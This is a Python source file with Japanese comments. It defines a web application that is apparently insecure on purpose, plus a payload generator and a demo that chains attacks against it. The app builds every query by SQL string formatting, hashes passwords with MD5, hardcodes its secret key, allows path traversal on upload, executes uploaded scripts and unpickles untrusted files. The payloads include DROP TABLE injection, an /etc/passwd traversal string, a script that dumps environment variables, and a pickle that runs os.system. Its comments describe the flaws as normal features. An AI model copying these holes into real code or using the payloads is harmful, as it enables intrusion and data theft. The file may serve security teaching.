# Webアプリケーションのサンプルコード
# 複数の機能が組み合わさって動作するシステムです

import sqlite3
import hashlib
import hmac
import base64
import json
import os
import time
import random
import urllib.parse
from typing import Dict, List, Optional, Any
import tempfile
import subprocess
import pickle

class VulnerableWebApplication:
    """多機能なWebアプリケーション"""

    def __init__(self, db_path: str = "app.db"):
        self.db_path = db_path
        self.session_store = {}
        self.upload_dir = "uploads"
        self.secret_key = "default_secret_key"  # デフォルトの秘密鍵
        self.init_database()

        # アップロードディレクトリの作成
        if not os.path.exists(self.upload_dir):
            os.makedirs(self.upload_dir)

    def init_database(self):
        """データベースの初期化"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        # ユーザーテーブルの作成
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY,
                username TEXT UNIQUE,
                password_hash TEXT,
                email TEXT,
                role TEXT DEFAULT 'user',
                profile_data TEXT
            )
        ''')

        # ファイルテーブルの作成
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS files (
                id INTEGER PRIMARY KEY,
                filename TEXT,
                filepath TEXT,
                owner_id INTEGER,
                is_public INTEGER DEFAULT 0,
                FOREIGN KEY (owner_id) REFERENCES users (id)
            )
        ''')

        conn.commit()
        conn.close()

    def register_user(self, username: str, password: str, email: str, profile_data: Dict = None) -> bool:
        """ユーザー登録処理"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()

            password_hash = hashlib.md5(password.encode()).hexdigest()  # パスワードのハッシュ化

            # データベースへのユーザー情報挿入
            query = f"INSERT INTO users (username, password_hash, email, profile_data) VALUES ('{username}', '{password_hash}', '{email}', '{json.dumps(profile_data)}')"
            cursor.execute(query)

            conn.commit()
            conn.close()
            return True

        except Exception as e:
            print(f"登録エラー: {e}")  # エラー情報の出力
            return False

    def login(self, username: str, password: str) -> Optional[str]:
        """ログイン処理"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()

            password_hash = hashlib.md5(password.encode()).hexdigest()

            # ユーザー認証のためのデータベース検索
            query = f"SELECT id, username, role FROM users WHERE username = '{username}' AND password_hash = '{password_hash}'"
            cursor.execute(query)
            user = cursor.fetchone()

            conn.close()

            if user:
                # セッショントークンの生成
                session_token = base64.b64encode(f"{username}:{int(time.time())}".encode()).decode()

                # セッション情報の保存
                self.session_store[session_token] = {
                    'user_id': user[0],
                    'username': user[1],
                    'role': user[2],
                    'login_time': time.time()
                }

                return session_token

            return None

        except Exception as e:
            print(f"ログインエラー: {e}")
            return None

    def get_user_profile(self, session_token: str, target_username: str) -> Optional[Dict]:
        """ユーザープロファイル取得"""
        if session_token not in self.session_store:
            return None

        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()

            # 指定されたユーザーの情報を取得
            query = f"SELECT username, email, role, profile_data FROM users WHERE username = '{target_username}'"
            cursor.execute(query)
            user_data = cursor.fetchone()

            conn.close()

            if user_data:
                profile_data = json.loads(user_data[3]) if user_data[3] else {}
                return {
                    'username': user_data[0],
                    'email': user_data[1],
                    'role': user_data[2],
                    'profile': profile_data
                }

            return None

        except Exception as e:
            print(f"プロファイル取得エラー: {e}")
            return None

    def upload_file(self, session_token: str, filename: str, file_content: bytes) -> bool:
        """ファイルアップロード処理"""
        if session_token not in self.session_store:
            return False

        user_info = self.session_store[session_token]

        try:
            # ファイルの保存先パスを設定
            filepath = os.path.join(self.upload_dir, filename)

            with open(filepath, 'wb') as f:
                f.write(file_content)

            # データベースに記録
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()

            query = f"INSERT INTO files (filename, filepath, owner_id) VALUES ('{filename}', '{filepath}', {user_info['user_id']})"
            cursor.execute(query)

            conn.commit()
            conn.close()

            return True

        except Exception as e:
            print(f"アップロードエラー: {e}")
            return False

    def execute_uploaded_script(self, session_token: str, filename: str) -> str:
        """アップロードされたスクリプトの実行"""
        if session_token not in self.session_store:
            return "認証が必要です"

        user_info = self.session_store[session_token]

        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()

            # ファイルの存在確認
            query = f"SELECT filepath FROM files WHERE filename = '{filename}'"
            cursor.execute(query)
            file_record = cursor.fetchone()

            conn.close()

            if not file_record:
                return "ファイルが見つかりません"

            filepath = file_record[0]

            # ファイル形式に応じた実行処理
            if filepath.endswith('.py'):
                result = subprocess.run(['python', filepath], capture_output=True, text=True)
                return result.stdout + result.stderr
            elif filepath.endswith('.sh'):
                result = subprocess.run(['bash', filepath], capture_output=True, text=True)
                return result.stdout + result.stderr
            else:
                return "サポートされていないファイル形式です"

        except Exception as e:
            return f"実行エラー: {e}"

    def backup_user_data(self, session_token: str) -> str:
        """ユーザーデータのバックアップ"""
        if session_token not in self.session_store:
            return "認証が必要です"

        user_info = self.session_store[session_token]

        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()

            # ユーザーデータの取得
            query = f"SELECT * FROM users WHERE id = {user_info['user_id']}"
            cursor.execute(query)
            user_data = cursor.fetchone()

            conn.close()

            if user_data:
                # pickleを使用したデータのシリアライゼーション
                backup_data = {
                    'user_info': user_data,
                    'session_info': user_info,
                    'backup_time': time.time()
                }

                serialized_data = pickle.dumps(backup_data)
                backup_filename = f"backup_{user_info['username']}_{int(time.time())}.pkl"
                backup_path = os.path.join(self.upload_dir, backup_filename)

                with open(backup_path, 'wb') as f:
                    f.write(serialized_data)

                return f"バックアップが作成されました: {backup_filename}"

            return "ユーザーデータが見つかりません"

        except Exception as e:
            return f"バックアップエラー: {e}"

    def restore_user_data(self, session_token: str, backup_filename: str) -> str:
        """ユーザーデータの復元"""
        if session_token not in self.session_store:
            return "認証が必要です"

        try:
            backup_path = os.path.join(self.upload_dir, backup_filename)

            if not os.path.exists(backup_path):
                return "バックアップファイルが見つかりません"

            # pickleファイルからのデータ復元
            with open(backup_path, 'rb') as f:
                backup_data = pickle.load(f)  # データの読み込み

            return f"データが復元されました: {backup_data}"

        except Exception as e:
            return f"復元エラー: {e}"

class PayloadGenerator:
    """テスト用ペイロードの生成（デモンストレーション用）"""

    @staticmethod
    def create_sql_injection_payload() -> str:
        """SQL特殊文字を含むペイロード"""
        return "admin'; DROP TABLE users; --"

    @staticmethod
    def create_path_traversal_payload() -> str:
        """パス文字列のペイロード"""
        return "../../../etc/passwd"

    @staticmethod
    def create_malicious_script() -> bytes:
        """テスト用スクリプトの生成"""
        script_content = '''
import os
import sys

# システム情報の取得
print("=== システム情報 ===")
print(f"OS: {os.name}")
print(f"Python バージョン: {sys.version}")
print(f"現在のディレクトリ: {os.getcwd()}")

# ファイル一覧の表示
print("\\n=== ファイル一覧 ===")
for root, dirs, files in os.walk("."):
    for file in files:
        print(os.path.join(root, file))

# 環境変数の表示
print("\\n=== 環境変数 ===")
for key, value in os.environ.items():
    print(f"{key}: {value}")
'''
        return script_content.encode()

    @staticmethod
    def create_malicious_pickle() -> bytes:
        """テスト用pickleオブジェクトの生成"""
        class TestClass:
            def __reduce__(self):
                import os
                return (os.system, ('echo "Pickle deserialization attack successful!"',))

        return pickle.dumps(TestClass())

def demonstrate_chained_vulnerabilities():
    """アプリケーション機能のデモンストレーション"""
    print("=== アプリケーション機能のデモンストレーション ===")

    # アプリケーションの初期化
    app = VulnerableWebApplication()
    payload_gen = PayloadGenerator()

    print("\n1. 通常のユーザー登録:")
    success = app.register_user("testuser", "password123", "test@example.com", {"age": 25})
    print(f"登録結果: {success}")

    print("\n2. 特殊文字を含むユーザー名での登録を試行:")
    special_username = payload_gen.create_sql_injection_payload()
    try:
        app.register_user(special_username, "password", "test2@example.com")
    except Exception as e:
        print(f"処理結果: {e}")

    print("\n3. 正常ログインとセッション取得:")
    session_token = app.login("testuser", "password123")
    print(f"セッショントークン: {session_token}")

    if session_token:
        print("\n4. 他ユーザー情報の取得:")
        profile = app.get_user_profile(session_token, "admin")  # 管理者ユーザーの情報を取得
        print(f"取得したプロファイル: {profile}")

        print("\n5. テストファイルのアップロード:")
        test_script = payload_gen.create_malicious_script()
        upload_success = app.upload_file(session_token, "test.py", test_script)
        print(f"アップロード結果: {upload_success}")

        if upload_success:
            print("\n6. アップロードしたスクリプトの実行:")
            execution_result = app.execute_uploaded_script(session_token, "test.py")
            print(f"実行結果:\n{execution_result}")

        print("\n7. 特殊パス名でのファイルアップロード:")
        special_filename = payload_gen.create_path_traversal_payload()
        try:
            app.upload_file(session_token, special_filename, b"test content")
        except Exception as e:
            print(f"処理結果: {e}")

        print("\n8. データのバックアップと復元:")
        backup_result = app.backup_user_data(session_token)
        print(f"バックアップ結果: {backup_result}")

        # テスト用pickleファイルの作成
        test_pickle = payload_gen.create_malicious_pickle()
        app.upload_file(session_token, "test_backup.pkl", test_pickle)

        restore_result = app.restore_user_data(session_token, "test_backup.pkl")
        print(f"復元結果: {restore_result}")

    print("\n=== 機能の連携 ===")
    print("1. ユーザー認証 → セッション管理")
    print("2. データベース操作 → 情報の保存・取得")
    print("3. ユーザー管理 → プロファイル情報の取得")
    print("4. ファイル管理 → アップロード・保存機能")
    print("5. スクリプト実行 → 動的処理機能")
    print("6. データシリアライゼーション → バックアップ・復元機能")

if __name__ == "__main__":
    demonstrate_chained_vulnerabilities()
